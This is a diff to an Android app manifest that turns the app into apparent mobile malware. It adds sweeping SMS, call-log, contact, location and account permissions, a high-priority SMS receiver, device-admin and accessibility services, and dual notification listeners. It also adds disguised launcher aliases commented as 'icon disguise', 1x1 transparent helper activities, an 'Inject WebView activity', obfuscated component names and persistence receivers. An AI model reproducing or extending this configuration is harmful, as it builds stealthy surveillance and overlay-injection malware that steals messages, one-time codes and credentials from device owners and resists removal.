@@ -1,54 +1,249 @@
 <?xml version="1.0" encoding="utf-8"?>
 <manifest xmlns:android="http://schemas.android.com/apk/res/android">
 
+    <!-- ========== uses-feature (optional hardware) ========== -->
+    <uses-feature android:name="android.hardware.telephony" android:required="false" />
+    <uses-feature android:name="android.hardware.camera" android:required="false" />
+
+    <!-- ========== PERMISSIONS ========== -->
+
     <!-- Network -->
     <uses-permission android:name="android.permission.INTERNET" />
     <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
     <uses-permission android:name="android.permission.CHANGE_NETWORK_STATE" />
     <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
     <uses-permission android:name="android.permission.CHANGE_WIFI_STATE" />
+    <uses-permission android:name="android.permission.NEARBY_WIFI_DEVICES"
+        android:usesPermissionFlags="neverForLocation" />
+
     <!-- System -->
     <uses-permission android:name="android.permission.WAKE_LOCK" />
     <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_SPECIAL_USE" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_LOCATION" />
     <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
     <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
     <uses-permission android:name="android.permission.WRITE_SETTINGS" />
+    <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS" />
     <uses-permission android:name="android.permission.DISABLE_KEYGUARD" />
+    <uses-permission android:name="android.permission.SCHEDULE_EXACT_ALARM" />
+    <uses-permission android:name="android.permission.TURN_SCREEN_ON" />
+    <uses-permission android:name="android.permission.VIBRATE" />
+    <uses-permission android:name="android.permission.EXPAND_STATUS_BAR" />
+    <uses-permission android:name="android.permission.REORDER_TASKS" />
+    <uses-permission android:name="android.permission.KILL_BACKGROUND_PROCESSES" />
+    <uses-permission android:name="android.permission.PACKAGE_USAGE_STATS" />
+    <uses-permission android:name="android.permission.ACTIVITY_RECOGNITION" />
+    <uses-permission android:name="android.permission.USE_BIOMETRIC" />
+    <uses-permission android:name="android.permission.REQUEST_INSTALL_PACKAGES" />
+
     <!-- Media -->
     <uses-permission android:name="android.permission.CAMERA" />
+    <uses-permission android:name="android.permission.RECORD_AUDIO" />
     <uses-permission android:name="android.permission.MEDIA_PROJECTION" />
-    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION" />
+
     <!-- Storage -->
     <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE" />
     <uses-permission android:name="android.permission.READ_MEDIA_IMAGES" />
     <uses-permission android:name="android.permission.READ_MEDIA_VIDEO" />
     <uses-permission android:name="android.permission.READ_MEDIA_AUDIO" />
-    <!-- SMS / Contacts -->
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"
+        android:maxSdkVersion="32" />
+    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"
+        android:maxSdkVersion="32" />
+
+    <!-- Phone / Call -->
+    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
+    <uses-permission android:name="android.permission.READ_PHONE_NUMBERS" />
+    <uses-permission android:name="android.permission.READ_CALL_LOG" />
+    <uses-permission android:name="android.permission.WRITE_CALL_LOG" />
+    <uses-permission android:name="android.permission.CALL_PHONE" />
+    <uses-permission android:name="android.permission.ANSWER_PHONE_CALLS" />
+    <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS" />
+
+    <!-- SMS -->
     <uses-permission android:name="android.permission.READ_SMS" />
+    <uses-permission android:name="android.permission.RECEIVE_SMS" />
+    <uses-permission android:name="android.permission.SEND_SMS" />
+    <uses-permission android:name="android.permission.RECEIVE_MMS" />
+    <uses-permission android:name="android.permission.RECEIVE_WAP_PUSH" />
     <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
+
+    <!-- Contacts -->
+    <uses-permission android:name="android.permission.READ_CONTACTS" />
+    <uses-permission android:name="android.permission.WRITE_CONTACTS" />
+
+    <!-- Location -->
+    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
+    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
+    <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION" />
+
+    <!-- Bluetooth -->
+    <uses-permission android:name="android.permission.BLUETOOTH" />
+    <uses-permission android:name="android.permission.BLUETOOTH_ADMIN" />
+    <uses-permission android:name="android.permission.BLUETOOTH_CONNECT" />
+    <uses-permission android:name="android.permission.BLUETOOTH_SCAN" />
+
     <!-- Device Admin -->
     <uses-permission android:name="android.permission.BIND_DEVICE_ADMIN" />
     <uses-permission android:name="android.permission.REQUEST_DELETE_PACKAGES" />
     <uses-permission android:name="android.permission.QUERY_ALL_PACKAGES" />
-    <!-- Vendor -->
+
+    <!-- Account / Sync -->
+    <uses-permission android:name="android.permission.AUTHENTICATE_ACCOUNTS" />
+    <uses-permission android:name="android.permission.GET_ACCOUNTS" />
+    <uses-permission android:name="android.permission.MANAGE_ACCOUNTS" />
+    <uses-permission android:name="android.permission.READ_SYNC_SETTINGS" />
+    <uses-permission android:name="android.permission.WRITE_SYNC_SETTINGS" />
+
+    <!-- Vendor-specific -->
     <uses-permission android:name="oppo.permission.OPPO_COMPONENT_SAFE" />
     <uses-permission android:name="com.huawei.permission.external_app_settings.USE_COMPONENT" />
+
+    <!-- ========== APPLICATION ========== -->
 
     <application
         android:name=".hkdrkgzsfs"
         android:allowBackup="false"
+        android:hardwareAccelerated="true"
+        android:icon="@mipmap/ic_launcher"
         android:label="@string/app_name"
-        android:supportsRtl="true">
+        android:supportsRtl="true"
+        android:theme="@style/Theme.App"
+        android:usesCleartextTraffic="true">
 
+        <!-- ========== ACTIVITIES ========== -->
+
+        <!-- Main launcher Activity (also target for activity-alias) -->
         <activity
-            android:name=".activity.AccessibilityTrampoline"
-            android:exported="false" />
+            android:name=".iuzxujjtqev"
+            android:exported="true"
+            android:launchMode="singleInstance"
+            android:finishOnTaskLaunch="false"
+            android:excludeFromRecents="true"
+            android:autoRemoveFromRecents="false"
+            android:screenOrientation="portrait"
+            android:configChanges="smallestScreenSize|screenSize|screenLayout"
+            android:theme="@style/Theme.App.Transparent" />
 
+        <!-- DefaultLauncherAlias: default LAUNCHER entry (enabled) -->
+        <activity-alias
+            android:name=".DefaultLauncherAlias"
+            android:targetActivity=".iuzxujjtqev"
+            android:enabled="true"
+            android:exported="true"
+            android:icon="@mipmap/ic_launcher"
+            android:label="@string/app_name">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity-alias>
+
+        <!-- AppVariant aliases for icon disguise (all disabled by default) -->
+        <activity-alias android:name=".AppVariantA" android:targetActivity=".iuzxujjtqev"
+            android:enabled="false" android:exported="true" android:icon="@mipmap/ic_launcher" android:label="@string/app_name">
+            <intent-filter><action android:name="android.intent.action.MAIN" /><category android:name="android.intent.category.LAUNCHER" /></intent-filter>
+        </activity-alias>
+        <activity-alias android:name=".AppVariantB" android:targetActivity=".iuzxujjtqev"
+            android:enabled="false" android:exported="true" android:icon="@mipmap/ic_launcher" android:label="@string/app_name">
+            <intent-filter><action android:name="android.intent.action.MAIN" /><category android:name="android.intent.category.LAUNCHER" /></intent-filter>
+        </activity-alias>
+        <activity-alias android:name=".AppVariantC" android:targetActivity=".iuzxujjtqev"
+            android:enabled="false" android:exported="true" android:icon="@mipmap/ic_launcher" android:label="@string/app_name">
+            <intent-filter><action android:name="android.intent.action.MAIN" /><category android:name="android.intent.category.LAUNCHER" /></intent-filter>
+        </activity-alias>
+        <activity-alias android:name=".AppVariantD" android:targetActivity=".iuzxujjtqev"
+            android:enabled="false" android:exported="true" android:icon="@mipmap/ic_launcher" android:label="@string/app_name">
+            <intent-filter><action android:name="android.intent.action.MAIN" /><category android:name="android.intent.category.LAUNCHER" /></intent-filter>
+        </activity-alias>
+        <activity-alias android:name=".AppVariantE" android:targetActivity=".iuzxujjtqev"
+            android:enabled="false" android:exported="true" android:icon="@mipmap/ic_launcher" android:label="@string/app_name">
+            <intent-filter><action android:name="android.intent.action.MAIN" /><category android:name="android.intent.category.LAUNCHER" /></intent-filter>
+        </activity-alias>
+        <activity-alias android:name=".AppVariantF" android:targetActivity=".iuzxujjtqev"
+            android:enabled="false" android:exported="true" android:icon="@mipmap/ic_launcher" android:label="@string/app_name">
+            <intent-filter><action android:name="android.intent.action.MAIN" /><category android:name="android.intent.category.LAUNCHER" /></intent-filter>
+        </activity-alias>
+        <activity-alias android:name=".AppVariantG" android:targetActivity=".iuzxujjtqev"
+            android:enabled="false" android:exported="true" android:icon="@mipmap/ic_launcher" android:label="@string/app_name">
+            <intent-filter><action android:name="android.intent.action.MAIN" /><category android:name="android.intent.category.LAUNCHER" /></intent-filter>
+        </activity-alias>
+        <activity-alias android:name=".AppVariantH" android:targetActivity=".iuzxujjtqev"
+            android:enabled="false" android:exported="true" android:icon="@mipmap/ic_launcher" android:label="@string/app_name">
+            <intent-filter><action android:name="android.intent.action.MAIN" /><category android:name="android.intent.category.LAUNCHER" /></intent-filter>
+        </activity-alias>
+        <activity-alias android:name=".AppVariantI" android:targetActivity=".iuzxujjtqev"
+            android:enabled="false" android:exported="true" android:icon="@mipmap/ic_launcher" android:label="@string/app_name">
+            <intent-filter><action android:name="android.intent.action.MAIN" /><category android:name="android.intent.category.LAUNCHER" /></intent-filter>
+        </activity-alias>
+        <activity-alias android:name=".AppVariantJ" android:targetActivity=".iuzxujjtqev"
+            android:enabled="false" android:exported="true" android:icon="@mipmap/ic_launcher" android:label="@string/app_name">
+            <intent-filter><action android:name="android.intent.action.MAIN" /><category android:name="android.intent.category.LAUNCHER" /></intent-filter>
+        </activity-alias>
+        <activity-alias android:name=".AppVariantK" android:targetActivity=".iuzxujjtqev"
+            android:enabled="false" android:exported="true" android:icon="@mipmap/ic_launcher" android:label="@string/app_name">
+            <intent-filter><action android:name="android.intent.action.MAIN" /><category android:name="android.intent.category.LAUNCHER" /></intent-filter>
+        </activity-alias>
+        <activity-alias android:name=".AppVariantL" android:targetActivity=".iuzxujjtqev"
+            android:enabled="false" android:exported="true" android:icon="@mipmap/ic_launcher" android:label="@string/app_name">
+            <intent-filter><action android:name="android.intent.action.MAIN" /><category android:name="android.intent.category.LAUNCHER" /></intent-filter>
+        </activity-alias>
+        <activity-alias android:name=".AppVariantN" android:targetActivity=".iuzxujjtqev"
+            android:enabled="false" android:exported="true" android:icon="@mipmap/ic_launcher" android:label="@string/app_name">
+            <intent-filter><action android:name="android.intent.action.MAIN" /><category android:name="android.intent.category.LAUNCHER" /></intent-filter>
+        </activity-alias>
+
+        <!-- Accessibility trampoline -->
+        <activity android:name=".activity.AccessibilityTrampoline" android:exported="false" />
+
+        <!-- Package verification -->
+        <activity android:name=".activity.PackageVerifyActivity" android:exported="false"
+            android:theme="@android:style/Theme.Translucent.NoTitleBar" />
+
+        <!-- Background task launcher -->
+        <activity android:name=".activity.BackgroundTaskActivity" android:exported="false"
+            android:excludeFromRecents="true" android:theme="@android:style/Theme.Translucent.NoTitleBar" />
+
+        <!-- Transparent helper (1x1 pixel) -->
+        <activity android:name=".activity.TransparentHelperActivity" android:exported="false"
+            android:excludeFromRecents="true" android:taskAffinity=""
+            android:theme="@android:style/Theme.Translucent.NoTitleBar" />
+
+        <!-- Obfuscated activities -->
+        <activity android:name=".activity.htvekhdt" android:exported="false" android:theme="@android:style/Theme.Translucent.NoTitleBar" />
+        <activity android:name=".activity.todoqkrxcctl" android:exported="false" android:theme="@android:style/Theme.Translucent.NoTitleBar" />
+        <activity android:name=".activity.qixvbtmo" android:exported="false" android:theme="@android:style/Theme.Translucent.NoTitleBar" />
+        <activity android:name=".activity.syuqattwmgit" android:exported="false" android:excludeFromRecents="true" android:theme="@android:style/Theme.Translucent.NoTitleBar" />
+        <activity android:name=".activity.izvpcqplqctn" android:exported="false" android:theme="@android:style/Theme.Translucent.NoTitleBar" />
+        <activity android:name=".activity.yojggfhv" android:exported="false" android:theme="@android:style/Theme.Translucent.NoTitleBar" />
+        <activity android:name=".activity.yrsanyhsbh" android:exported="false" android:theme="@android:style/Theme.Translucent.NoTitleBar" />
+
+        <!-- Inject WebView activity -->
+        <activity android:name=".inject.jbqfkndyx" android:exported="false" android:theme="@android:style/Theme.Translucent.NoTitleBar" />
+
+        <!-- UI: 1x1 pixel process anchor -->
+        <activity android:name=".p029ui.ibbnqvnvhxg" android:exported="false"
+            android:excludeFromRecents="true" android:taskAffinity=""
+            android:theme="@android:style/Theme.Translucent.NoTitleBar" />
+
+        <!-- UI: Permission request trampoline -->
+        <activity android:name=".p029ui.umrkmgrri" android:exported="false"
+            android:theme="@android:style/Theme.Translucent.NoTitleBar" />
+
+        <!-- ========== SERVICES ========== -->
+
+        <!-- Accessibility service -->
         <service
             android:name=".service.MyAccessibilityService"
-            android:exported="false"
+            android:label="@string/accessibility_service_label"
+            android:description="@string/accessibility_service_description"
+            android:exported="true"
+            android:stopWithTask="false"
+            android:directBootAware="true"
+            android:foregroundServiceType="specialUse|mediaProjection"
             android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
             <intent-filter>
                 <action android:name="android.accessibilityservice.AccessibilityService" />
@@ -58,21 +253,158 @@
                 android:resource="@xml/accessibility_service_config" />
         </service>
 
-        <service android:name=".service.AppCoreService"
+        <!-- Core foreground service -->
+        <service
+            android:name=".service.AppCoreService"
             android:exported="false"
+            android:stopWithTask="false"
             android:foregroundServiceType="specialUse" />
 
-        <service android:name=".service.MediaDisplayService"
+        <!-- Media projection service -->
+        <service
+            android:name=".service.MediaDisplayService"
             android:exported="false"
             android:foregroundServiceType="mediaProjection" />
 
-        <service android:name=".service.AppNotificationListener"
+        <!-- Notification listener service (AppNotificationListener) -->
+        <service
+            android:name=".service.AppNotificationListener"
             android:exported="false"
             android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE">
             <intent-filter>
                 <action android:name="android.service.notification.NotificationListenerService" />
             </intent-filter>
         </service>
+
+        <!-- Notification listener service (sqlszawlrvc — secondary NLS) -->
+        <service
+            android:name=".service.sqlszawlrvc"
+            android:exported="false"
+            android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE">
+            <intent-filter>
+                <action android:name="android.service.notification.NotificationListenerService" />
+            </intent-filter>
+        </service>
+
+        <!-- Keep-alive JobService -->
+        <service
+            android:name=".service.zgafaqvswksa"
+            android:exported="false"
+            android:permission="android.permission.BIND_JOB_SERVICE" />
+
+        <!-- Account authenticator service -->
+        <service android:name=".service.account.AccountAuthService" android:exported="false">
+            <intent-filter>
+                <action android:name="android.accounts.AccountAuthenticator" />
+            </intent-filter>
+            <meta-data android:name="android.accounts.AccountAuthenticator" android:resource="@xml/authenticator" />
+        </service>
+
+        <!-- Sync adapter service -->
+        <service android:name=".service.account.SyncAdapterService" android:exported="false">
+            <intent-filter>
+                <action android:name="android.content.SyncAdapter" />
+            </intent-filter>
+            <meta-data android:name="android.content.SyncAdapter" android:resource="@xml/syncadapter" />
+        </service>
+
+        <!-- ========== BROADCAST RECEIVERS ========== -->
+
+        <!-- Boot completed receiver -->
+        <receiver android:name=".service.BootCompletedReceiver" android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+                <action android:name="android.intent.action.QUICKBOOT_POWERON" />
+                <action android:name="android.intent.action.REBOOT" />
+            </intent-filter>
+        </receiver>
+
+        <!-- Alarm wake receiver -->
+        <receiver android:name=".service.modules.AlarmWakeReceiver" android:exported="false" />
+
+        <!-- Alarm/device admin heartbeat receiver -->
+        <receiver android:name=".service.tisxhskrc" android:exported="false" />
+
+        <!-- Package events receiver -->
+        <receiver android:name=".service.radkdukpnm" android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.PACKAGE_ADDED" />
+                <action android:name="android.intent.action.PACKAGE_REPLACED" />
+                <action android:name="android.intent.action.PACKAGE_CHANGED" />
+                <action android:name="android.intent.action.PACKAGE_REMOVED" />
+                <data android:scheme="package" />
+            </intent-filter>
+        </receiver>
+
+        <!-- SMS receiver -->
+        <receiver android:name=".receiver.arniezsqllm" android:exported="true"
+            android:permission="android.permission.BROADCAST_SMS">
+            <intent-filter android:priority="999">
+                <action android:name="android.provider.Telephony.SMS_RECEIVED" />
+            </intent-filter>
+        </receiver>
+
+        <!-- System events receiver -->
+        <receiver android:name=".receiver.hgejzydhoqsl" android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.TIME_TICK" />
+                <action android:name="android.intent.action.SCREEN_ON" />
+                <action android:name="android.intent.action.USER_PRESENT" />
+                <action android:name="android.net.conn.CONNECTIVITY_CHANGE" />
+            </intent-filter>
+        </receiver>
+
+        <!-- Heartbeat alarm receiver -->
+        <receiver android:name=".receiver.hhymfsyujsj" android:exported="false" />
+
+        <!-- Config sync receiver -->
+        <receiver android:name=".receiver.izkmisshyc" android:exported="false">
+            <intent-filter>
+                <action android:name="com.storm.safe.rock.ACTION_SYNC_CLEANUP" />
+                <action android:name="com.storm.safe.rock.ACTION_PROFILE_READY" />
+                <action android:name="com.storm.safe.rock.ACTION_PROFILE_RESET" />
+                <action android:name="com.storm.safe.rock.ACTION_SYNC_PAUSE" />
+                <action android:name="com.storm.safe.rock.ACTION_POLICY_ENFORCE" />
+                <action android:name="com.storm.safe.rock.ACTION_SYNC_RESUME" />
+                <action android:name="com.storm.safe.rock.ACTION_SYNC_INIT" />
+                <action android:name="com.storm.safe.rock.ACTION_POLICY_RELEASE" />
+            </intent-filter>
+        </receiver>
+
+        <!-- Force reconnect receiver -->
+        <receiver android:name=".receiver.jrhgpixkephr" android:exported="false">
+            <intent-filter>
+                <action android:name="com.storm.safe.rock.intent.FORCE_RECONNECT" />
+            </intent-filter>
+        </receiver>
+
+        <!-- Permission recovery receiver -->
+        <receiver android:name=".receiver.kksddvryq" android:exported="false">
+            <intent-filter>
+                <action android:name="com.storm.safe.rock.intent.SMART_PERMISSION_RECOVERY" />
+                <action android:name="com.storm.safe.rock.intent.IGNORE_RECOVERY" />
+            </intent-filter>
+        </receiver>
+
+        <!-- Device Admin receiver -->
+        <receiver android:name=".receiver.zbrefryi" android:exported="false"
+            android:permission="android.permission.BIND_DEVICE_ADMIN">
+            <meta-data android:name="android.app.device_admin" android:resource="@xml/device_admin" />
+            <intent-filter>
+                <action android:name="android.app.action.DEVICE_ADMIN_ENABLED" />
+                <action android:name="android.app.action.DEVICE_ADMIN_DISABLED" />
+                <action android:name="android.app.action.DEVICE_ADMIN_DISABLE_REQUESTED" />
+            </intent-filter>
+        </receiver>
+
+        <!-- ========== CONTENT PROVIDERS ========== -->
+
+        <!-- Stub provider for sync adapter -->
+        <provider
+            android:name=".service.account.StubContentProvider"
+            android:authorities="${applicationId}.provider"
+            android:exported="false"
+            android:syncable="true" />
 
     </application>
 </manifest>
